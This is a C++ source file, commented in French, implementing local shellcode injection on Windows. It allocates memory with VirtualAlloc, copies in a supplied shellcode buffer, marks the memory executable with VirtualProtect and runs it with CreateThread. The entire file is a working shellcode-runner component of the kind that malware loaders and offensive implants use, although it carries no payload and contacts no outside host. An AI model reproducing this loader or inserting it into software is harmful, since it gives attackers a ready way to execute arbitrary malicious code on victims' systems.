#include "Memory.h"
#include <iostream>

bool injectShellcodeLocal(PBYTE shellcode, SIZE_T shellcodeSize) {
    // Allouer de la mémoire pour le shellcode
    LPVOID allocatedMemory = VirtualAlloc(
        NULL,                           // Adresse préférée
        shellcodeSize,                  // Taille de la mémoire
        MEM_COMMIT | MEM_RESERVE,       // Type d'allocation
        PAGE_READWRITE                  // Permissions initiales
    );

    if (!allocatedMemory) {
        std::cerr << "Erreur : VirtualAlloc a échoué avec l'erreur : " << GetLastError() << std::endl;
        return false;
    }

    std::cout << "Mémoire allouée à l'adresse : " << allocatedMemory << std::endl;

    // Copier le shellcode dans la mémoire allouée
    memcpy(allocatedMemory, shellcode, shellcodeSize);

    // Modifier les permissions pour exécuter le shellcode
    DWORD oldProtect;
    if (!VirtualProtect(allocatedMemory, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "Erreur : VirtualProtect a échoué avec l'erreur : " << GetLastError() << std::endl;
        VirtualFree(allocatedMemory, 0, MEM_RELEASE);
        return false;
    }

    // Créer un thread pour exécuter le shellcode
    HANDLE hThread = CreateThread(
        NULL,                           // Sécurité par défaut
        0,                              // Taille de la pile par défaut
        (LPTHREAD_START_ROUTINE)allocatedMemory, // Adresse de démarrage
        NULL,                           // Aucun paramètre
        0,                              // Flags
        NULL                            // ID du thread
    );

    if (!hThread) {
        std::cerr << "Erreur : CreateThread a échoué avec l'erreur : " << GetLastError() << std::endl;
        VirtualFree(allocatedMemory, 0, MEM_RELEASE);
        return false;
    }

    std::cout << "Thread créé avec succès pour exécuter le shellcode." << std::endl;

    // Attendre la fin du thread
    WaitForSingleObject(hThread, INFINITE);

    // Nettoyer les ressources
    CloseHandle(hThread);
    VirtualFree(allocatedMemory, 0, MEM_RELEASE);

    return true;
}
